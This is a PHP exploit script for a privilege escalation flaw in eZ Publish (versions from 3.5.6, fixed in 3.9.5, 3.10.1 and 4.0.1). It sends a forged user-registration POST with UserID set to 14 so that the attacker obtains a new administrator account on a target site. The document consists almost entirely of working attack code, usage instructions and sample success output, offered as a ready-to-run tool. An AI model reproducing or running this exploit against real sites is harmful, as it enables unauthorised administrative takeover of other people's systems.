<?php

/*
	eZ Publish privilege escalation exploit by s4avrd0w [s4avrd0w@p0c.ru]
	Versions affected >= 3.5.6
	Resolved in 3.9.5, 3.10.1, 4.0.1
	More info: http://ez.no/developer/security/security_advisories/ez_publish_3_9/ezsa_2008_003_insufficient_form_handling_made_privilege_escalation_possible

	* tested on version 3.9.0

	usage: 

	# ./eZPublish_privilege_escalation_exploit.php -u=username -p=password -e=email -s=EZPublish_server

	The options are required:

	-u Login of the new admin on eZ Publish
	-p Password of the new admin on eZ Publish
	-e Email where to go the letter for activation new admin account
	-s Target for privilege escalation

	example:

	# ./eZPublish_privilege_escalation_exploit.php -u=toor -p=P@ssw0rd -e=toor@mail.ru -s=http://www.example.com/
	[+] Exploit successfully sending
	[+] Activate your new account and be registered in system using toor/P@ssw0rd
*/

function help_argc($script_name)
{
print "
usage:

# ./".$script_name." -u=username -p=password -e=email -s=EZPublish_server

The options are required:
 -u Login of the new admin on eZ Publish
 -p Password of the new admin on eZ Publish
 -e Email where to go the letter for activation new admin account
 -s Target for privilege escalation

example:

# ./".$script_name." -u=toor -p=P@ssw0rd -e=toor@mail.ru -s=http://www.example.com/
[+] Exploit successfully sending
[+] Activate your new account and be registered in system using toor/P@ssw0rd

";
}

function successfully($login,$password)
{
print "
[+] Exploit successfully sending
[+] Activate your new account and be registered in system using $login/$password
";
}

if ($argc != 5 || in_array($argv[1], array('--help', '-help', '-h', '-?')))
{
	help_argc($argv[0]);
	exit(0);
}
else
{
	$ARG = array(); 
	foreach ($argv as $arg) { 
		if (strpos($arg, '-') === 0) { 
			$key = substr($arg,1,1);
			if (!isset($ARG[$key])) $ARG[$key] = substr($arg,3,strlen($arg)); 
		} 
	}

	if ($ARG[u] && $ARG[p] && $ARG[e] && $ARG[s])
	{

		$post_fields = array(
			'ContentObjectAttribute_data_user_login_30' => $ARG[u],
			'ContentObjectAttribute_data_user_password_30' => $ARG[p],
			'ContentObjectAttribute_data_user_password_confirm_30' => $ARG[p],
			'ContentObjectAttribute_data_user_email_30' => $ARG[e],
			'UserID' => '14',
			'PublishButton' => '1'
		);

		$headers = array(
		    'User-Agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14',
		    'Referer' => $ARG[s]
		);

		$res_http = new HttpRequest($ARG[s]."/user/register", HttpRequest::METH_POST);
		$res_http->addPostFields($post_fields);
		$res_http->addHeaders($headers);
		try {
    			$response = $res_http->send()->getBody();

			if (eregi("success", $response))
			{
				successfully($ARG[u],$ARG[p]);
			}
			else
			{
				print "[-] Exploit failed";
			}

		} catch (HttpException $exception) {

			print "[-] Not connected";
			exit(0);

		}

	}
	else
	{
		help_argc($argv[0]);
		exit(0);
	} 
}

?>

